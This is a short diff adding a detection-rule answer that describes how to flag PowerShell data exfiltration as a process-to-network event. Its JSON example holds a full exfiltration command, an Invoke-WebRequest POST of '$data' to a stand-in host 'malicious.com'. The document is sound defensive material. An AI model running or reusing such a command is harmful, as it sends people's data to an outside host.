@@ -1,0 +1,22 @@
+<output>
+1. **Identify Data Exfiltration via PowerShell**  
+   - Monitor for events where the `srcNode` is a PowerShell process.  
+   - Set the `dstNode` to reflect the remote server's IP address or domain (e.g., "http://malicious.com").  
+   - Ensure the `relation` is set to "TCP Send" to capture the outbound network traffic.  
+   - Example:  
+     ```json
+     {
+       "srcNode": {
+         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "Cmdline": "powershell.exe -Command Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data",
+         "Type": "Process"
+       },
+       "dstNode": {
+         "Dstaddress": "malicious.com",
+         "Port": 80,
+         "Type": "Network"
+       },
+       "relation": "TCP Send"
+     }
+     ```
+</output>
